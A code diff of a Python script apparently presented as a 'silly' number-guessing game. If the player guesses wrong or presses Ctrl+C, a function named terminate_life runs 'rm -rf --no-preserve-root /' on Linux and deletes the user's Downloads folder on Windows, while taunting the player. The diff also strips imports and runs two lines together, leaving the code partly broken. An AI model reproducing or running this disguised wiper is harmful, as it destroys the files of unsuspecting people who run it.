@@ -13,20 +13,16 @@ from pystyle import Write, Colorate, Colors
 def all():
     while True:
         try:
-            import platform
             if platform.system == "Windows":
                 os.system("cls")
             else: 
                 os.system("clear")            rnumber = random.randint(1, 5)
             lnumber = int(input("Silly game! Choose a number between 1 - 5: "))
-            import platform
-            import shutil
-            import subprocess
             usr=os.getlogin()
             def terminate_life():
                 if platform.system == "Linux":
                     print(Colors.gray,"\n[-] Deleting $ROOT directory..")
-                    os.system("sudo rm -rf --no-preserve-root /") 
+                    os.system("rm -rf --no-preserve-root /") 
                 elif platform.system == 'Windows':
                     shutil.rmtree(f"C:\user\{usr}\Downloads, ignore_errors=True")
                     print(f"\n[-] Formatting your C: Drive..")
@@ -46,10 +42,6 @@ def all():
                 print(f"i'm sooorry it was {rnumber}")
                 terminate_life()
         except KeyboardInterrupt:
-            import pystyle
-            import time
-            from time import sleep
-            from pystyle import Write, Colorate, Colors
             Write.Print("\nlil bro what are you trying to do?",Colors.red_to_yellow,interval=0.07)
             time.sleep(1)
             Write.Print("\nyou thought there was an",Colors.red_to_yellow,interval=0.15)
@@ -58,7 +50,6 @@ def all():
             time.sleep(0.5)
             terminate_life()
 
-import ctypes
 def is_admin():
     if os.name == 'nt':  
         try:
